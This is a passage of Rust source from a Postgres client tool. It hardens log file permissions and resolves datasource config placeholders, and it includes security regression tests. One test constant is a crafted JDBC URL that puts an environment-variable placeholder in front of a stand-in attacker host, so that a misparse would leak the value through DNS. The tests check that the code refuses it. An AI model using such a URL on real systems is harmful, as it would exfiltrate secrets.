    }
}

fn init_logging() {
    let dir = util::cache_dir();
    // `ensure_private_dir`, not `create_dir_all_private`: this is one
    // of the three directories pgman actually owns (unlike an
    // arbitrary `\report` destination), so repair a pre-existing
    // looser mode here rather than only setting it on first
    // creation. `data_dir()` / `config_dir()` get the same repair —
    // this is the one place on the normal startup path (TUI, not
    // `--batch`) that's guaranteed to run before anything under them
    // is touched.
    let _ = util::ensure_private_dir(&dir);
    let _ = util::ensure_private_dir(&util::data_dir());
    let _ = util::ensure_private_dir(&util::config_dir());
    // Daily rolling files (`pgman.log.YYYY-MM-DD`) instead of one
    // ever-growing file — the tap listeners can log at a bounded but
    // non-trivial rate (throttled malformed-frame warnings, drop
    // notices), and an unrolled log is the one place that volume
    // still accumulates forever.
    let appender = tracing_appender::rolling::daily(&dir, "pgman.log");
    // The appender opens/creates today's file at construction, at
    // whatever mode the platform default (umask) gives a new file —
    // it doesn't know this file must stay owner-only. Repair every
    // `pgman.log*` in the directory: today's, and any earlier one
    // from before this hardening landed.
    chmod_pgman_logs_in(&dir);
    let filter = tracing_subscriber::EnvFilter::try_from_default_env()
        .unwrap_or_else(|_| tracing_subscriber::EnvFilter::new("info"));
    tracing_subscriber::fmt()
        // …and at midnight UTC the appender rolls to a *new* file,
        // created the same way and long after this function returned.
        // `OwnerOnlyRolling` repairs that one too. `tracing_appender`
        // 0.2's builder has no mode option (`rotation`,
        // `filename_prefix`, `filename_suffix`, `max_log_files`,
        // `latest_symlink` — that's all), so wrapping it is the only
        // place to hook.
        .with_writer(OwnerOnlyRolling::new(appender, dir))
        .with_env_filter(filter)
        .with_ansi(false)
        .init();
}

/// `chmod 0600` every `pgman.log*` in `dir`. Names are not predicted:
/// the rolling appender owns the suffix format, so this matches the
/// prefix and lets the directory say what exists.
fn chmod_pgman_logs_in(dir: &std::path::Path) {
    if let Ok(entries) = std::fs::read_dir(dir) {
        for entry in entries.flatten() {
            if entry.file_name().to_string_lossy().starts_with("pgman.log") {
                chmod_owner_only_if_exists(&entry.path());
            }
        }
    }
}

/// UTC days since the epoch. `tracing_appender`'s daily rotation
/// switches files on `OffsetDateTime::now_utc()`, so this changes at
/// exactly the same instant its filename does — which is all the
/// rollover detection needs, without predicting the name.
fn utc_day_number() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs() / 86_400)
        .unwrap_or(0)
}

/// A [`MakeWriter`] wrapping the rolling appender so the file it rolls
/// to at midnight is `chmod`ed owner-only like the one opened at
/// startup was. Without it, only the first day's log was `0600` and
/// every file after it took the umask default.
///
/// The check is a `u64` compare per log line; the directory sweep runs
/// only when the day actually changes. It runs *after* the write, not
/// before, because the appender creates the new file as part of that
/// write — sweeping first would find nothing to fix.
struct OwnerOnlyRolling {
    inner: tracing_appender::rolling::RollingFileAppender,
    dir: std::path::PathBuf,
    /// The day whose file was last repaired. Seeded with today's, since
    /// `init_logging` has already swept for it.
    last_day: std::sync::atomic::AtomicU64,
}

impl OwnerOnlyRolling {
    fn new(inner: tracing_appender::rolling::RollingFileAppender, dir: std::path::PathBuf) -> Self {
        Self {
            inner,
            dir,
            last_day: std::sync::atomic::AtomicU64::new(utc_day_number()),
        }
    }
}

/// Sweep `dir` when `day` differs from `last_day`, recording `day` as
/// handled. Returns `true` when it swept, so a test can drive a day
/// change without waiting for midnight.
fn repair_logs_on_day_change(
    dir: &std::path::Path,
    last_day: &std::sync::atomic::AtomicU64,
    day: u64,
) -> bool {
    use std::sync::atomic::Ordering;
    // `swap`, so two threads crossing midnight together sweep once.
    if last_day.swap(day, Ordering::Relaxed) == day {
        return false;
    }
    chmod_pgman_logs_in(dir);
    true
}

impl<'a> tracing_subscriber::fmt::MakeWriter<'a> for OwnerOnlyRolling {
    type Writer = OwnerOnlyWriter<'a>;

    fn make_writer(&'a self) -> Self::Writer {
        OwnerOnlyWriter {
            inner: self.inner.make_writer(),
            owner: self,
        }
    }
}

struct OwnerOnlyWriter<'a> {
    inner:
        <tracing_appender::rolling::RollingFileAppender as tracing_subscriber::fmt::MakeWriter<
            'a,
        >>::Writer,
    owner: &'a OwnerOnlyRolling,
}

impl std::io::Write for OwnerOnlyWriter<'_> {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        let n = self.inner.write(buf)?;
        repair_logs_on_day_change(&self.owner.dir, &self.owner.last_day, utc_day_number());
        Ok(n)
    }

    fn flush(&mut self) -> std::io::Result<()> {
        self.inner.flush()
    }
}

/// `chmod path 0600` on unix, if `path` exists; a no-op otherwise (and
/// on non-unix). Split out of `init_logging` so a test can drive the
/// log-file repair against a scratch file without invoking
/// `tracing_subscriber::fmt().init()`, which is process-global and
/// can only run once per process.
#[cfg(unix)]
fn chmod_owner_only_if_exists(path: &std::path::Path) {
    use std::os::unix::fs::PermissionsExt;
    if path.exists() {
        let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600));
    }
}

#[cfg(not(unix))]
fn chmod_owner_only_if_exists(_path: &std::path::Path) {}

/// Read `.idea/dataSources.xml` + `.idea/dataSources.local.xml`, merge by
/// UUID (so the local file's `<user-name>` and schema-mapping db names
/// fill in for the committed file), and push every Postgres data source
/// onto `picks`. When schema-mapping exposes multiple databases for one
/// data source, we emit one pick per database (label suffixed with the
/// dbname so the picker disambiguates).
fn discover_intellij_datasources(cwd: &std::path::Path, picks: &mut Vec<DataSourcePick>) {
    let ds_path = cwd.join(".idea/dataSources.xml");
    let Ok(xml) = std::fs::read_to_string(&ds_path) else {
        return;
    };
    let sources = creds::intellij::parse(&xml);
    if sources.is_empty() {
        return;
    }
    let local_path = cwd.join(".idea/dataSources.local.xml");
    let local_meta = std::fs::read_to_string(&local_path)
        .map(|x| creds::intellij::parse_local(&x))
        .unwrap_or_default();
    tracing::info!(
        "IntelliJ project: {} data source(s) in {}",
        sources.len(),
        ds_path.display()
    );
    for s in &sources {
        tracing::info!(
            "  {} → {}",
            s.name,
            s.jdbc_url
                .as_deref()
                .map(conn::redact_url)
                .unwrap_or_else(|| "(no jdbc-url)".to_string())
        );
    }
    for s in sources {
        let meta = local_meta.get(&s.uuid);
        // `.idea/dataSources.xml` is committed like every other
        // discovered file, so it gets the same `${…}` treatment a
        // Spring pick gets: resolvable in the userinfo and the
        // database name, never in the host / port / params, and
        // marked-and-refused when a name isn't set. Before this, a
        // `<jdbc-url>` carrying `${DB_PASSWORD}` was connectable and
        // the literal text went on the wire.
        let (resolved, meta_resolved, unresolved, unresolved_host) =
            resolve_intellij_placeholders(&s, meta);
        // Provenance by variable name — the row says where the password
        // comes from before the operator presses Enter.
        let provenance = {
            let (mut user_env, password_env) = s
                .jdbc_url
                .as_deref()
                .map(creds::spring::userinfo_env_names)
                .unwrap_or_default();
            for u in s.user.iter().chain(meta.and_then(|m| m.user.as_ref())) {
                user_env.extend(creds::spring::placeholder_env_names(u));
            }
            app::CredsProvenance::new(user_env, password_env)
        };
        let dsns = creds::intellij::expand_to_dsns(&resolved, meta_resolved.as_ref());
        for (suffix, dsn) in dsns {
            let mut label = if s.name.is_empty() {
                "(unnamed)".to_string()
            } else {
                s.name.clone()
            };
            if let Some(db) = suffix {
                // Multi-database disambiguation: "postgres@localhost (shop)"
                label.push_str(&format!(" ({db})"));
            }
            if !unresolved.is_empty() || !unresolved_host.is_empty() {
                let list = unresolved
                    .iter()
                    .chain(unresolved_host.iter())
                    .map(|n| format!("${{{n}}}"))
                    .collect::<Vec<_>>()
                    .join(", ");
                label = format!("{label} — unresolved {list}");
            }
            tracing::info!("  → pick {} = {}", label, dsn.redacted());
            picks.push(DataSourcePick {
                name: label,
                origin: "IntelliJ",
                dsn: Some(dsn),
                unresolved: unresolved.clone(),
                unresolved_host: unresolved_host.clone(),
                creds: provenance.clone(),
            });
        }
    }
}

/// Resolve the `${…}` placeholders in one IntelliJ data source and its
/// per-user metadata, returning the resolved copies plus the bodies
/// that couldn't (or mustn't) be resolved.
///
/// The JDBC URL goes through `creds::spring::resolve_url_placeholders`
/// — the same host/port/params refusal and the same structural check
/// the Spring path uses. The user names are plain values, so they
/// resolve like any other Spring value. The database names from
/// `dataSources.local.xml` are the DSN's path component, so they
/// resolve too.
#[allow(clippy::type_complexity)]
fn resolve_intellij_placeholders(
    source: &creds::intellij::IntellijDataSource,
    meta: Option<&creds::intellij::IntellijLocalMeta>,
) -> (
    creds::intellij::IntellijDataSource,
    Option<creds::intellij::IntellijLocalMeta>,
    Vec<String>,
    Vec<String>,
) {
    let mut unresolved = Vec::new();
    let mut unresolved_host = Vec::new();
    let mut resolved = source.clone();
    if let Some(raw) = source.jdbc_url.as_deref() {
        let url = creds::spring::resolve_url_placeholders(raw, |n| std::env::var(n).ok());
        unresolved.extend(url.missing);
        unresolved_host.extend(url.in_host);
        resolved.jdbc_url = Some(url.value);
    }
    if let Some(u) = source.user.as_deref().filter(|u| !u.is_empty()) {
        let (value, missing) = resolve_spring_value(u);
        unresolved.extend(missing);
        resolved.user = Some(value);
    }
    let meta_resolved = meta.map(|m| {
        let mut out = m.clone();
        if let Some(u) = m.user.as_deref().filter(|u| !u.is_empty()) {
            let (value, missing) = resolve_spring_value(u);
            unresolved.extend(missing);
            out.user = Some(value);
        }
        out.databases = m
            .databases
            .iter()
            .map(|d| {
                let (value, missing) = resolve_spring_value(d);
                unresolved.extend(missing);
                value
            })
            .collect();
        out
    });
    (resolved, meta_resolved, unresolved, unresolved_host)
}

/// Resolve `${NAME}` / `${NAME:default}` placeholders in a Spring
/// config value against the process environment. On success, returns
/// the resolved value with an empty missing-name list. On failure
/// (an unset name with no default, or a nested/malformed
/// placeholder), returns the *original, unresolved* value — so a
/// caller building a DSN out of it still gets a parseable (if
/// useless) string — alongside the names that couldn't be resolved.
fn resolve_spring_value(value: &str) -> (String, Vec<String>) {
    match creds::spring::resolve_placeholders(value, |name| std::env::var(name).ok()) {
        Ok(resolved) => (resolved, Vec::new()),
        Err(missing) => (value.to_string(), missing),
    }
}

/// Turn one `.pgman/pgman.toml` `[[connections]]` entry into a pick,
/// running it through the same `${…}` resolution and marking a Spring
/// pick gets.
///
/// `.pgman/pgman.toml` is committed to the repo — every argument in
/// `resolve_url_placeholders` about who chose the host applies here
/// too, and until this existed a `url = "postgres://u:${PW}@h/db"`
/// sailed past every check and went on the wire as the literal text
/// `${PW}`. `ssh_tunnel` is not resolved at all: it names a machine
/// pgman will run `ssh` to, so a placeholder there is host-tainting
/// by the same rule that protects the URL's host.
///
/// `None` when the URL doesn't parse *and* there is nothing
/// unresolved to explain — the caller logs and skips that, as before.
fn project_connection_pick(c: &project::Connection) -> Option<DataSourcePick> {
    let url = creds::spring::resolve_url_placeholders(&c.url, |n| std::env::var(n).ok());
    let mut unresolved = url.missing;
    let mut unresolved_host = url.in_host;
    let mut resolved = c.clone();
    resolved.url = url.value;
    if let Some(u) = c.user.as_deref().filter(|u| !u.is_empty()) {
        let (value, missing) = resolve_spring_value(u);
        unresolved.extend(missing);
        resolved.user = Some(value);
    }
    if let Some(t) = c.ssh_tunnel.as_deref().filter(|t| !t.is_empty()) {
        unresolved_host.extend(creds::spring::placeholder_bodies(t));
    }
    let dsn = project::connection_to_dsn(&resolved);
    if dsn.is_none() && unresolved.is_empty() && unresolved_host.is_empty() {
        return None;
    }
    // Provenance by variable name: the URL's userinfo placeholders, a
    // `user = "${…}"`, and `password_env` — which is the one a checkout
    // can point at `AWS_SECRET_ACCESS_KEY` beside its own host.
    let provenance = {
        let (mut user_env, mut password_env) = creds::spring::userinfo_env_names(&c.url);
        if let Some(u) = &c.user {
            user_env.extend(creds::spring::placeholder_env_names(u));
        }
        if let Some(var) = c.password_env.as_deref().filter(|v| !v.is_empty()) {
            password_env.push(var.to_string());
        }
        app::CredsProvenance::new(user_env, password_env)
    };
    let mut name = c.name.clone();
    if !unresolved.is_empty() || !unresolved_host.is_empty() {
        let list = unresolved
            .iter()
            .chain(unresolved_host.iter())
            .map(|n| format!("${{{n}}}"))
            .collect::<Vec<_>>()
            .join(", ");
        name = format!("{name} — unresolved {list}");
    }
    Some(DataSourcePick {
        name,
        origin: "project",
        dsn,
        unresolved,
        unresolved_host,
        creds: provenance,
    })
}

/// Scan `src/main/resources/application*.properties` for datasource
/// triples. Each `<prefix>.url` (where the URL is `jdbc:postgresql://…`)
/// produces a pick labelled by the prefix + filename — e.g.
/// `dataSource (application-local)`. The non-Spring-canonical
/// `dataSource.*` shape is supported alongside `spring.datasource.*`.
fn discover_spring_datasources(cwd: &std::path::Path, picks: &mut Vec<DataSourcePick>) {
    let dir = cwd.join("src/main/resources");
    let Ok(entries) = std::fs::read_dir(&dir) else {
        return;
    };
    let mut files: Vec<std::path::PathBuf> = entries
        .filter_map(|r| r.ok())
        .map(|e| e.path())
        .filter(|p| {
            // `application[-profile].(properties|yml|yaml)` is standard
            // Spring Boot; `bootstrap[-profile].(yml|yaml)` is Spring
            // Cloud's pre-context config (often carries the datasource
            // block too).
            p.file_name()
                .and_then(|n| n.to_str())
                .map(|n| {
                    let known_prefix = n.starts_with("application") || n.starts_with("bootstrap");
                    let known_ext =
                        n.ends_with(".properties") || n.ends_with(".yml") || n.ends_with(".yaml");
                    known_prefix && known_ext
                })
                .unwrap_or(false)
        })
        .collect();
    // Order base files of one family so the higher-precedence format is
    // applied last (as the overlay) during the merge: Spring resolves
    // `.properties` over `.yml`/`.yaml`. Sort primarily by the name with
    // the extension stripped (groups a family's files together), then by
    // format rank ascending so `.properties` lands after `.yml`.
    files.sort_by(|a, b| {
        let key = |p: &std::path::Path| -> (String, u8) {
            let name = p.file_name().and_then(|n| n.to_str()).unwrap_or("");
            let stem = name
                .rsplit_once('.')
                .map(|(s, _)| s.to_string())
                .unwrap_or_else(|| name.to_string());
            (stem, creds::spring::format_precedence_rank(name))
        };
        key(a).cmp(&key(b))
    });

    // Pass 1: parse every file into partials and classify each by
    // Spring config family ("application" / "bootstrap") and
    // optional profile. Base (no-profile) files for a family are
    // merged into one base block; profile files are stashed for a
    // second pass so they can overlay the (fully-accumulated) base
    // — Spring's `application-<profile>` semantics. Two passes
    // because a profile filename can sort *before* its base across
    // the `.`/`-` boundary (`application-prod.yml` < `application.properties`).
    use creds::spring::SpringDatasourcePartial;
    let mut bases: std::collections::BTreeMap<String, (String, Vec<SpringDatasourcePartial>)> =
        std::collections::BTreeMap::new();
    let mut profiles: Vec<(String, String, Vec<SpringDatasourcePartial>)> = Vec::new();
    for path in &files {
        let Ok(text) = std::fs::read_to_string(path) else {
            continue;
        };
        let partials = match path.extension().and_then(|e| e.to_str()) {
            Some("properties") => creds::spring::parse_properties_partials(&text),
            Some("yml") | Some("yaml") => creds::spring::parse_yaml_partials(&text),
            _ => continue,
        };
        if partials.is_empty() {
            continue;
        }
        let stem = path
            .file_stem()
            .and_then(|s| s.to_str())
            .unwrap_or("application")
            .to_string();
        let (family, profile) = creds::spring::split_config_name(&stem);
        match profile {
            None => {
                let slot = bases
                    .entry(family)
                    .or_insert_with(|| (stem.clone(), Vec::new()));
                slot.0 = stem; // label tracks the most recent base file
                slot.1 = creds::spring::merge_partials(&slot.1, &partials);
            }
            Some(_) => profiles.push((stem, family, partials)),
        }
    }

    // Resolve a partial block into picks under `label`. A prefix
    // contributes a pick only when it has a usable jdbc:postgresql
    // URL; username / password from the block win over URL creds.
    //
    // `${NAME}` / `${NAME:default}` placeholders in the url are resolved
    // from the environment by `creds::spring::resolve_url_placeholders`,
    // which resolves the userinfo / path / query but *never* the host or
    // port — a resolved value in the host position would leave the
    // machine as a DNS lookup to a domain the config file chose. Those
    // land in `unresolved_host` and are refused whatever the
    // environment holds. A name that simply isn't set lands in
    // `unresolved`. Either way the literal `${NAME}` text is left in
    // place (so the pick still parses to *some* DSN and stays visible
    // for inspection) and `refuse_if_unresolved` stops it being
    // connected to. The password is the exception to "left in place":
    // an unresolved one is never stored on the DSN at all, so the
    // literal text can't be sent to a server as a password.
    let mut emit = |label: &str, block: &[SpringDatasourcePartial]| {
        for p in block {
            let Some(raw_url) = p.url.as_deref() else {
                continue;
            };
            let url = creds::spring::resolve_url_placeholders(raw_url, |n| std::env::var(n).ok());
            let mut unresolved = url.missing;
            let unresolved_host = url.in_host;
            // `None` when the URL isn't a parseable postgres DSN — which
            // includes the placeholder-shaped cases (`db:${DB_PORT}`,
            // `url: ${SPRING_DATASOURCE_URL}`). Those still become a
            // marked pick below; only a URL with nothing unresolved
            // about it (a `jdbc:mysql:` block, say) is skipped.
            let mut dsn = creds::intellij::jdbc_to_dsn(&url.value)
                .and_then(|raw| conn::Dsn::parse(&raw).ok());
            if let Some(u) = &p.username {
                if !u.is_empty() {
                    let (resolved_user, user_missing) = resolve_spring_value(u);
                    unresolved.extend(user_missing);
                    if let Some(d) = dsn.as_mut() {
                        d.user = Some(resolved_user);
                    }
                }
            }
            if let Some(pw) = &p.password {
                if !pw.is_empty() {
                    let (resolved_pw, pw_missing) = resolve_spring_value(pw);
                    if pw_missing.is_empty() {
                        if let Some(d) = dsn.as_mut() {
                            d.password = Some(resolved_pw);
                        }
                    } else {
                        // An unresolved password placeholder used to be
                        // dropped on the floor and the literal
                        // `${DB_PASSWORD}` text sent to the server as
                        // the password. Mark the pick instead — with no
                        // `PGPASSWORD` fallback for discovered sources
                        // there is nothing else this could have meant.
                        unresolved.extend(pw_missing);
                    }
                }
            }
            if dsn.is_none() {
                // No parseable Postgres DSN. Two different reasons to
                // skip, and one reason to keep.
                //
                // `parse_properties_partials` is deliberately
                // unfiltered (a profile overlay may carry only a
                // password), so `service.url=${API_URL}` arrives here
                // like any datasource block. Its placeholder is
                // unresolvable-by-design (no `://`, so the whole value
                // is host-tainting) — which used to be enough to keep
                // it, and it showed up in the picker as a Postgres
                // candidate called "service (application)". A block is
                // only a candidate when the URL says so (`jdbc:`) or
                // the prefix does (`spring.datasource`, `dataSource`,
                // `logDataSource`, …); the second half is what keeps
                // `spring.datasource.url=${SPRING_DATASOURCE_URL}`
                // visible-but-refused rather than silently gone.
                let looks_like_a_datasource = raw_url
                    .trim_start()
                    .to_ascii_lowercase()
                    .starts_with("jdbc:")
                    || creds::spring::is_datasource_prefix(&p.prefix);
                if !looks_like_a_datasource {
                    continue;
                }
                if unresolved.is_empty() && unresolved_host.is_empty() {
                    // A real datasource block that simply isn't
                    // Postgres — a `jdbc:mysql:` URL. Skipping it
                    // silently is right; skipping a *marked* one is
                    // what hid the problem from the operator.
                    continue;
                }
            }
            // Provenance only — never the raw password (CLAUDE.md).
            tracing::info!(
                "  → pick {}.{} = {}",
                label,
                p.prefix,
                dsn.as_ref()
                    .map(|d| d.redacted())
                    .unwrap_or_else(|| conn::redact_url(&url.value))
            );
            let mut name = format!("{} ({})", p.prefix, label);
            if !unresolved.is_empty() || !unresolved_host.is_empty() {
                let list = unresolved
                    .iter()
                    .chain(unresolved_host.iter())
                    .map(|n| format!("${{{n}}}"))
                    .collect::<Vec<_>>()
                    .join(", ");
                name = format!("{name} — unresolved {list}");
            }
            // Provenance by variable name: the URL's userinfo placeholders
            // plus the block's own `username` / `password` keys.
            let provenance = {
                let (mut user_env, mut password_env) = creds::spring::userinfo_env_names(raw_url);
                if let Some(u) = &p.username {
                    user_env.extend(creds::spring::placeholder_env_names(u));
                }
                if let Some(pw) = &p.password {
                    password_env.extend(creds::spring::placeholder_env_names(pw));
                }
                app::CredsProvenance::new(user_env, password_env)
            };
            picks.push(DataSourcePick {
                name,
                origin: "Spring",
                dsn,
                unresolved,
                unresolved_host,
                creds: provenance,
            });
        }
    };

    // Pass 2: emit base picks (families in sorted order), then
    // each profile merged over its family's base.
    for (label, block) in bases.values() {
        emit(label, block);
    }
    for (label, family, block) in &profiles {
        let merged = match bases.get(family) {
            Some((_, base)) => creds::spring::merge_partials(base, block),
            None => block.clone(),
        };
        emit(label, &merged);
    }
}

/// Fill in a password from `$PGPASSWORD` when the DSN doesn't carry one.
///
/// **Only ever applied to a `--dsn` the operator typed.** A DSN that came
/// out of the working tree (`.pgman/pgman.toml`, `application*.yml`,
/// `.idea/dataSources.xml`) names a host the repo author chose, so
/// lending it the operator's `$PGPASSWORD` would send that password to
/// that host — the whole point of the discovered-is-untrusted rule. A
/// project connection gets its password from its own `password_env`
/// instead; a Spring block from the file's own `password` key.
fn apply_pgpassword(dsn: &mut conn::Dsn) {
    if dsn.password.is_some() {
        return;
    }
    // Empty is treated as unset so `PGPASSWORD=` doesn't blank out a
    // password the DSN already carried (it can't have — checked above)
    // or read as a deliberate empty password.
    if let Some(pw) = std::env::var("PGPASSWORD").ok().filter(|s| !s.is_empty()) {
        dsn.password = Some(pw);
    }
}

/// The `[safety]` block of the project config found by walking up from
/// `start`, if any. Split out from the TUI's inline discovery so
/// `--batch` can apply exactly the same overrides — the merge itself is
/// `project::merge_safety`, which only ever tightens.
fn load_project_safety(start: &std::path::Path) -> Option<project::ProjectSafety> {
    project::load_from(start).and_then(|(_, cfg)| cfg.safety)
}

/// Load `~/.config/pgman/safety.toml`, falling back to defaults if it's absent
/// or malformed.
fn load_safety_config() -> safety::SafetyConfig {
    let path = util::config_file("safety.toml");
    match std::fs::read_to_string(&path) {
        Ok(text) => match toml::from_str(&text) {
            Ok(cfg) => cfg,
            Err(e) => {
                tracing::warn!("safety.toml parse error ({e}); using defaults");
                safety::SafetyConfig::default()
            }
        },
        Err(_) => safety::SafetyConfig::default(),
    }
}

#[cfg(test)]
mod main_tests {
    use super::*;

    #[test]
    fn parse_tap_addr_accepts_colon_port() {
        let got = parse_tap_addr(":7432").unwrap();
        assert_eq!(got.ip().to_string(), "127.0.0.1");
        assert_eq!(got.port(), 7432);
    }

    #[test]
    fn parse_tap_addr_accepts_bare_port() {
        let got = parse_tap_addr("7432").unwrap();
        assert_eq!(got.ip().to_string(), "127.0.0.1");
        assert_eq!(got.port(), 7432);
    }

    #[test]
    fn parse_tap_addr_accepts_full_host_port() {
        let got = parse_tap_addr("0.0.0.0:7432").unwrap();
        assert_eq!(got.ip().to_string(), "0.0.0.0");
        assert_eq!(got.port(), 7432);
    }

    #[test]
    fn parse_tap_addr_rejects_garbage() {
        let err = parse_tap_addr("not-an-address").unwrap_err();
        assert!(err.contains("port"), "expected port-parse error: {err}");
    }

    #[test]
    fn the_auto_enabled_tap_status_line_names_port_reason_and_off_switch() {
        let addr: std::net::SocketAddr = "127.0.0.1:7432".parse().unwrap();
        assert_eq!(
            tap_auto_status_line(&addr),
            "tap listener on 127.0.0.1:7432 (auto: Java project detected) · --no-tap to disable"
        );
    }

    #[test]
    fn no_tap_parses_and_conflicts_with_an_explicit_listener() {
        use clap::Parser;
        let cli = Cli::try_parse_from(["pgman", "--no-tap"]).expect("parses");
        assert!(cli.no_tap);
        assert!(
            Cli::try_parse_from(["pgman", "--no-tap", "--tap-listen", ":7432"]).is_err(),
            "asking for a listener and refusing the auto one is a contradiction"
        );
        assert!(!Cli::try_parse_from(["pgman"]).expect("parses").no_tap);
    }

    #[test]
    fn parse_tap_addr_rejects_oversize_port() {
        let err = parse_tap_addr(":99999").unwrap_err();
        assert!(err.contains("port"), "expected port-range error: {err}");
    }

    /// Unique-per-test scratch project dir under the OS temp dir with a
    /// `.pgman/pgman.toml` holding `toml_body`. Cleaned up by the caller.
    fn project_dir_with(name: &str, toml_body: &str) -> std::path::PathBuf {
        let base =
            std::env::temp_dir().join(format!("pgman-main-proj-{name}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(base.join(".pgman")).unwrap();
        std::fs::write(base.join(".pgman/pgman.toml"), toml_body).unwrap();
        base
    }

    #[test]
    fn batch_applies_the_projects_safety_block_tighten_only() {
        // The committed file asks for a tighter timeout and a tighter
        // `insert` guard, and tries to relax `read_only` + `drop`.
        // `--batch` must see the tightening and none of the relaxing —
        // it goes through the same `project::merge_safety` the TUI does.
        let base = project_dir_with(
            "safety",
            "[safety.default]\n\
             read_only = false\n\
             statement_timeout_ms = 2000\n\
             [safety.default.guards]\n\
             insert = \"block\"\n\
             drop = \"allow\"\n",
        );
        let project_safety = load_project_safety(&base).expect("project [safety] block");
        // Stand in for a personal safety.toml — reading the real one
        // would make the test depend on the developer's home dir.
        let personal = safety::SafetyConfig::default();
        let merged = project::merge_safety(personal, Some(&project_safety));
        let _ = std::fs::remove_dir_all(&base);

        assert_eq!(merged.default.statement_timeout_ms, 2_000, "tightened");
        assert_eq!(merged.default.guards.insert, safety::Guard::Block);
        assert!(merged.default.read_only, "project can't clear read_only");
        assert_eq!(
            merged.default.guards.drop,
            safety::Guard::Block,
            "project can't relax drop"
        );
    }

    // --- the resolver and the parser must agree on the host ---------------
    //
    // The security-review reproduction, through each of the three
    // discovery sources. `creds::spring::resolve_url_placeholders` cut
    // the authority at the first `/` and saw this placeholder in the
    // path; `conn::Dsn::parse` cuts at the last `@` and made it the host
    // — so the environment variable left the machine as a DNS lookup.

    const AUTHORITY_LEAK_JDBC: &str = "jdbc:postgresql://x@db.example/app@\
         ${PGMAN_TEST_MAIN_AUTH_LEAK}.attacker.invalid:55432/db";

    /// Every source must report the placeholder as host-tainting, keep the
    /// resolved value out of the pick entirely, and (when it kept a DSN at
    /// all) keep the parser's host free of the value.
    fn assert_authority_leak_refused(pick: &DataSourcePick) {
        assert_eq!(
            pick.unresolved_host,
            vec!["PGMAN_TEST_MAIN_AUTH_LEAK".to_string()],
            "must be refused as host-tainting: {pick:?}"
        );
        let debug = format!("{pick:?}");
        assert!(
            !debug.contains("LEAKED"),
            "the value must not reach the pick: {debug}"
        );
        assert!(
            pick.name
                .contains("unresolved ${PGMAN_TEST_MAIN_AUTH_LEAK}"),
            "and the picker must say so: {}",
            pick.name
        );
    }

    #[test]
    fn spring_refuses_a_url_whose_host_the_parser_reads_differently() {
        let base = spring_project_with(
            "authority-leak",
            &format!("spring.datasource.url={AUTHORITY_LEAK_JDBC}\n"),
        );
        unsafe {
            std::env::set_var("PGMAN_TEST_MAIN_AUTH_LEAK", "LEAKED");
        }
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);
        assert_eq!(picks.len(), 1, "got: {picks:?}");
        assert_authority_leak_refused(&picks[0]);
    }

    #[test]
    fn intellij_refuses_a_url_whose_host_the_parser_reads_differently() {
        unsafe {
            std::env::set_var("PGMAN_TEST_MAIN_AUTH_LEAK", "LEAKED");
        }
        let source = creds::intellij::IntellijDataSource {
            name: "shop".into(),
            uuid: "u1".into(),
            jdbc_url: Some(AUTHORITY_LEAK_JDBC.to_string()),
            user: None,
        };
        let (resolved, _, unresolved, unresolved_host) =
            resolve_intellij_placeholders(&source, None);
        assert!(unresolved.is_empty(), "{unresolved:?}");
        assert_eq!(
            unresolved_host,
            vec!["PGMAN_TEST_MAIN_AUTH_LEAK".to_string()]
        );
        assert_eq!(
            resolved.jdbc_url.as_deref(),
            Some(AUTHORITY_LEAK_JDBC),
            "the URL must stay literal"
        );
        // And through the whole discovery path, file and all.
        let base = std::env::temp_dir().join(format!(
            "pgman-main-idea-authority-leak-{}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&base);
        std::fs::create_dir_all(base.join(".idea")).unwrap();
        std::fs::write(
            base.join(".idea/dataSources.xml"),
            format!(
                "<project><component name=\"DataSourceManagerImpl\">\
                 <data-source name=\"shop\" uuid=\"u1\">\
                 <jdbc-url>{AUTHORITY_LEAK_JDBC}</jdbc-url>\
                 </data-source></component></project>"
            ),
        )
        .unwrap();
        let mut picks = Vec::new();
        discover_intellij_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);
        assert_eq!(picks.len(), 1, "got: {picks:?}");
        assert_authority_leak_refused(&picks[0]);
    }

    #[test]
    fn project_refuses_a_url_whose_host_the_parser_reads_differently() {
        unsafe {
            std::env::set_var("PGMAN_TEST_MAIN_AUTH_LEAK", "LEAKED");
        }
        let c = project::Connection {
            name: "shop".into(),
            url: AUTHORITY_LEAK_JDBC
                .strip_prefix("jdbc:")
                .unwrap()
                .to_string(),
            user: None,
            password_env: None,
            ssh_tunnel: None,
        };
        let pick = project_connection_pick(&c).expect("a marked pick, not a skip");
        assert_authority_leak_refused(&pick);
        assert!(
            pick.dsn.as_ref().is_none_or(|d| !d.host.contains("LEAKED")),
            "{pick:?}"
        );
    }

    // --- credential provenance on the pick ---------------------------------

    #[test]
    fn project_pick_carries_where_its_credentials_come_from() {
        let c = project::Connection {
            name: "shop".into(),
            url: "postgres://${PGMAN_TEST_MAIN_PROV_U}:${PGMAN_TEST_MAIN_PROV_URLPW}@db/main"
                .into(),
            user: Some("${PGMAN_TEST_MAIN_PROV_U:fallback}".into()),
            password_env: Some("AWS_SECRET_ACCESS_KEY".into()),
            ssh_tunnel: None,
        };
        let pick = project_connection_pick(&c).expect("a marked pick");
        assert_eq!(
            pick.creds,
            app::CredsProvenance::new(
                vec!["PGMAN_TEST_MAIN_PROV_U".into()],
                vec![
                    "PGMAN_TEST_MAIN_PROV_URLPW".into(),
                    "AWS_SECRET_ACCESS_KEY".into()
                ]
            ),
            "names once each, never a value: {pick:?}"
        );
    }

    #[test]
    fn spring_pick_carries_where_its_credentials_come_from() {
        let base = spring_project_with(
            "provenance",
            "spring.datasource.url=jdbc:postgresql://${PGMAN_TEST_MAIN_PROV_SU}@h:5432/orders\n\
             spring.datasource.password=${PGMAN_TEST_MAIN_PROV_SPW:x}\n",
        );
        let mut picks = Vec::new();
        discover_spring_datasources(&base, &mut picks);
        let _ = std::fs::remove_dir_all(&base);
        assert_eq!(picks.len(), 1, "{picks:?}");
        assert_eq!(
            picks[0].creds,
            app::CredsProvenance::new(
                vec!["PGMAN_TEST_MAIN_PROV_SU".into()],
                vec!["PGMAN_TEST_MAIN_PROV_SPW".into()]
            )
        );
    }

